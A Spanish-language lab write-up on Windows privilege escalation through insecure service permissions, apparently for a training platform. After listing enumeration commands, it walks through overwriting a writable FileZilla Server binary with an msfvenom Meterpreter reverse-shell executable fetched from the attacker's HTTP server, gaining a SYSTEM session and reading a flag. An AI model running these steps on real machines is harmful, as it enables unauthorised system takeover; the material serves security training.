
# Insecure Service Permissions

## <mark style="color:purple;">Introducción</mark>

**Insecure Service Permissions** es una mala configuración en servicios de Windows donde usuarios no privilegiados pueden:

* Modificar la configuración del servicio (ej. `binPath`)
* Escribir sobre el ejecutable del servicio
* Escribir en el directorio del servicio

👉 Si el servicio corre como **SYSTEM**, esto puede permitir **escalada de privilegios**.

***

## <mark style="color:purple;">Comandos</mark>

### PowerUp (PowerSploit)

```powershell
# Importar módulo PowerUp
Import-Module .\PowerUp.ps1

# Ejecutar todas las comprobaciones
Invoke-AllChecks

# Buscar binarios de servicios modificables
Get-ModifiableServiceFile
```

***

### WinPEAS

```powershell
# Ejecutar enumeración automática
winpeas.exe
```

***

### PowerShell

```powershell
# Listar servicios con usuario y ruta
Get-WmiObject win32_service | select Name,StartName,PathName

# Filtrar servicios que corren como SYSTEM
Get-WmiObject win32_service | Where-Object {$_.StartName -eq "LocalSystem"}
```

***

### CMD / Nativo

```powershell
# Ver permisos del servicio
sc sdshow <servicio>

# Ver configuración del servicio (binPath, cuenta)
sc qc <servicio>

# Ver permisos del binario del servicio
icacls "C:\ruta\servicio.exe"

# Ver permisos del directorio del servicio
icacls "C:\ruta\"
```

***

### Sysinternals (AccessChk)

<pre class="language-powershell"><code class="lang-powershell"># Buscar servicios modificables por Users
.\accesschk.exe -uwcqv "Users" *

# Buscar servicios modificables por Authenticated Users
<strong>.\accesschk.exe -uwcqv "Authenticated Users" *
</strong></code></pre>

***

## <mark style="color:purple;">Lab: Bad Permissions</mark>

Tu tarea consiste en ejecutar el script de PowerShell [PowerUp.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1) para encontrar una vulnerabilidad común de escalada de privilegios en Windows que depende de configuraciones incorrectas.

En este entorno de laboratorio, se le proporcionará acceso a la interfaz gráfica de usuario (GUI) de una máquina Kali de ataque y de una máquina Windows de destino.

**Objetivo:** Obtener acceso a una sesión de Meterpreter con altos privilegios.

#### Lab

En este laboratorio podemos alternar fácilmente entre la máquina Kali y la máquina Windows objetivo y tenemos todos los scripts disponibles en el escritorio de la máquina Windows:

<figure><img src="/files/tVlf9j9GOVAbR4YcYCSj" alt=""><figcaption></figcaption></figure>

### Análisis con PowerUp

Observamos que hay un servicio FileZilla Server en el que tenemos `ModifiableFilePermissions`:

```powershell
PS C:\Users\student\Desktop\PowerSploit\Privesc> Import-Module .\PowerUp.ps1
PS C:\Users\student\Desktop\PowerSploit\Privesc> Invoke-AllChecks


ServiceName                     : FileZilla Server
Path                            : "C:\Program Files (x86)\FileZilla Server\FileZilla Server.exe"
ModifiableFile                  : C:\Program Files (x86)\FileZilla Server\FileZilla Server.exe
ModifiableFilePermissions       : {WriteOwner, Delete, WriteAttributes, Synchronize...}
ModifiableFileIdentityReference : PRIV-ESC\student
StartName                       : LocalSystem
AbuseFunction                   : Install-ServiceBinary -Name 'FileZilla Server'
CanRestart                      : True
Name                            : FileZilla Server
Check                           : Modifiable Service Files

ModifiablePath    : C:\Users\student\AppData\Local\Microsoft\WindowsApps
IdentityReference : PRIV-ESC\student
Permissions       : {WriteOwner, Delete, WriteAttributes, Synchronize...}
%PATH%            : C:\Users\student\AppData\Local\Microsoft\WindowsApps
Name              : C:\Users\student\AppData\Local\Microsoft\WindowsApps
Check             : %PATH% .dll Hijacks
AbuseFunction     : Write-HijackDll -DllPath 'C:\Users\student\AppData\Local\Microsoft\WindowsApps\wlbsctrl.dll'

Key            : HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Run\FileZilla Server Interface
Path           : "C:\Program Files (x86)\FileZilla Server\FileZilla Server Interface.exe"
ModifiableFile : @{ModifiablePath=C:\Program Files (x86)\FileZilla Server\FileZilla Server Interface.exe;
                 IdentityReference=PRIV-ESC\student; Permissions=System.Object[]}
Name           : HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Run\FileZilla Server Interface
Check          : Modifiable Registry Autorun
```

### Ver permisos del directorio

```powershell
PS C:\Users\student> Get-Acl "C:\Program Files (x86)\FileZilla Server" | Format-List

Path   : Microsoft.PowerShell.Core\FileSystem::C:\Program Files (x86)\FileZilla Server
Owner  : BUILTIN\Administrators
Group  : PRIV-ESC\None
Access : PRIV-ESC\student Allow  FullControl
         NT SERVICE\TrustedInstaller Allow  FullControl
         NT SERVICE\TrustedInstaller Allow  268435456
         NT AUTHORITY\SYSTEM Allow  FullControl
         NT AUTHORITY\SYSTEM Allow  268435456
         BUILTIN\Administrators Allow  FullControl
         BUILTIN\Administrators Allow  268435456
         BUILTIN\Users Allow  ReadAndExecute, Synchronize
         BUILTIN\Users Allow  -1610612736
         CREATOR OWNER Allow  268435456
         APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES Allow  ReadAndExecute, Synchronize
         APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES Allow  -1610612736
         APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES Allow  ReadAndExecute, Synchronize
         APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES Allow  -1610612736
Audit  :
Sddl   : O:BAG:S-1-5-21-3061667678-1811888172-2700530533-513D:AI(A;OICI;FA;;;S-1-5-21-3061667678-1811888172-2700530533-1008)(A;ID;FA;;;S-1-5-80-9560088
         85-3418522649-1831038044-1853292631-2271478464)(A;CIIOID;GA;;;S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464)(A;ID;FA;;;SY)(A;
         OICIIOID;GA;;;SY)(A;ID;FA;;;BA)(A;OICIIOID;GA;;;BA)(A;ID;0x1200a9;;;BU)(A;OICIIOID;GXGR;;;BU)(A;OICIIOID;GA;;;CO)(A;ID;0x1200a9;;;AC)(A;OICIIO
         ID;GXGR;;;AC)(A;ID;0x1200a9;;;S-1-15-2-2)(A;OICIIOID;GXGR;;;S-1-15-2-2)
```

Observamos que el usuario student tiene FullControl sobre el directorio:

```powershell
Access : PRIV-ESC\student Allow  FullControl
```

### Reemplazar ejecutable por uno malicioso

#### MSF Venom

Crearemos un ejecutable malicioso que se llame igual que el ejecutable de destino:

<pre class="language-bash"><code class="lang-bash">┌──(root㉿attackdefense)-[~]
└─# msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.49.2 LPORT=4444 -f exe > 'Filezilla Server.exe'
<strong>
</strong><strong>[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
</strong>[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 354 bytes
Final size of exe file: 73802 bytes
</code></pre>

#### Multi Handler

Abrimos un listener multi-handler para recibir el Meterpreter:

```bash
msfconsole
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 10.10.49.2
set LPORT 4444
set InitialAutoRunScript post/windows/manage/migrate
exploit

[*] Started reverse TCP handler on 10.10.49.2:4444 
```

#### Envio del ejecutable malicioso

```bash
# En Kali Linux
┌──(root㉿attackdefense)-[~]
└─# python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

```powershell
# En Windows
iwr -UseBasicParsing -Uri 'http://10.10.49.2/Filezilla Server.exe' -OutFile 'C:/Program
 Files (x86)/Filezilla Server/Filezilla Server.exe'
```

Con eso directamente se sobreescribe el binario original por nuestro binario malicioso:

<figure><img src="/files/NJMmUkgV4isA34ZppxYG" alt=""><figcaption></figcaption></figure>

### Reiniciar servicio

Antes de ejecutar el exploit necesitamos reiniciar el servicio para que cargue nuestro binario malicioso. Desde Servicios > Click derecho > Start

<figure><img src="/files/VXlipWlJuysTL2rRGCA2" alt=""><figcaption></figcaption></figure>

Observamos que da un error, el cual es totalmente normal, pero recibimos la sesión de Meterpreter como SYSTEM:

```bash
[*] Started reverse TCP handler on 10.10.49.2:4444 
[*] Sending stage (176198 bytes) to 10.2.25.209
[*] Session ID 2 (10.10.49.2:4444 -> 10.2.25.209:49904) processing InitialAutoRunScript 'post/windows/manage/migrate'
[*] Running module against PRIV-ESC
[*] Current server process: FileZilla Server.exe (4236)
[*] Spawning notepad.exe process to migrate into
[*] Spoofing PPID 0
[*] Migrating into 864
[+] Successfully migrated into process 864
[*] Meterpreter session 2 opened (10.10.49.2:4444 -> 10.2.25.209:49904) at 2026-03-31 14:58:35 +0530

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

### Acceso a la flag

```powershell
meterpreter > ls
Listing: C:\Users\Administrator\Downloads
=========================================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100666/rw-rw-rw-  282   fil   2020-10-27 15:14:30 +0530  desktop.ini
100666/rw-rw-rw-  32    fil   2020-10-28 10:14:07 +0530  flag.txt

meterpreter > cat flag.txt 
81f7a70ba854c677d46369cd********
```
